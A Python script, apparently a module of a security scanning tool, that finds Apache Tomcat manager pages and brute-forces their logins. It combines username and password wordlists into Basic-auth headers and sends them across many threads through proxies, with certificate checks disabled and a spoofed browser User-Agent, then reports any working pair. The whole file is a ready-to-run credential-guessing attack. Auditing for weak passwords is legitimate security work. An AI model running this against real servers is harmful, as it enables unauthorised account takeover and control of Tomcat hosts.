import requests 
import time 
import base64 
import os 
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from config.config_requests import headers, get_proxies, get_threads

username=[]
password=[]
names=open('dict/username.txt','r') 
for name in names: 
    name=name.rstrip() 
    username.append(name)
   
passwds=open('dict/password.txt','r') 
for passwd in passwds: 
    passwd=passwd.rstrip() 
    password.append(passwd)

def check_tomcat_manager(url, port, scheme):
    base_url = f"{scheme}://{url}:{port}"
    paths = ["/host-manager/html", "/manager/html"]
    for path in paths:
        try:
            r = requests.get(base_url + path, headers=headers, proxies=get_proxies(), verify=False, timeout=0.5)
            if r.status_code == 401:
                return (base_url, path)
        except Exception:
            pass
    return None

def brute_force(url1, vurl, user_pass_list):
    for user_pass in user_pass_list:
        try:
            pass1 = user_pass['user'] + ":" + user_pass['pass']
            bytes_data = base64.b64encode(pass1.encode('utf-8'))
            bs64_pass = bytes_data.decode('utf-8')
            headers1 = {
                'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
                'Authorization': 'Basic {}'.format(bs64_pass)
            }
            res = requests.get(url=url1, headers=headers1, proxies=get_proxies(), verify=False, timeout=5)
            if res.status_code == 200:
                return (1, '[+] [{}] is Vulnerable to weakpass! {}'.format(vurl, pass1))
        except Exception:
            continue
    return None

def do_brute_force(base_url, path, threads):
    url1 = base_url + path
    print('[*] Find Tomcat web : {}'.format(base_url))
    print('[*] Start brute force password on: {}'.format(base_url))
    user_pass_list = [{'user': u, 'pass': p} for u in username for p in password]
    
    chunk_size = max(1, len(user_pass_list) // threads)
    chunks = [user_pass_list[i:i + chunk_size] for i in range(0, len(user_pass_list), chunk_size)]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(brute_force, url1, base_url, chunk) for chunk in chunks]
        for future in as_completed(futures):
            result = future.result()
            if result and result[0] == 1:
                executor.shutdown(wait=False)
                return result
    return None

def run(url, port):
    results = []
    threads = get_threads()
    
    for scheme in ['http', 'https']:
        try:
            found = check_tomcat_manager(url, port, scheme)
            if found:
                base_url, path = found
                result = do_brute_force(base_url, path, threads)
                if result and result[0] == 1:
                    results.append(result)
        except Exception:
            pass
    
    if results:
        return results[0]
    return (0, "")

if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)
